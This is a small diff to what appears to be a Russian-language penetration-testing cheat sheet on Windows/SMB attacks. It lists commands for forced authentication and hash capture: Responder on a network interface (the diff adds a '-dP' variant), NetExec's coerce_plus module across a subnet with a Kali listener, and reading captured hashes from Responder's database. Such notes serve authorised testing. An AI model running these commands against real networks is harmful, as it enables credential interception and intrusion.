@@ -28,6 +28,7 @@ python3 SMB_killer.py -r remote_ip -l ip_kali -d domain.local -i tun0 -a Share -
 
 3 принудительная аутентификация (перехват хэшей)
 sudo responder -I eth0
+или sudo responder -I eth0 -dP
 nxc smb 192.168.0.0/24 -u user -p 'password' -M coerce_plus -o LISTENER=ip_kali   
 хэши sqlitebrowser /usr/share/responder/Responder.db
 
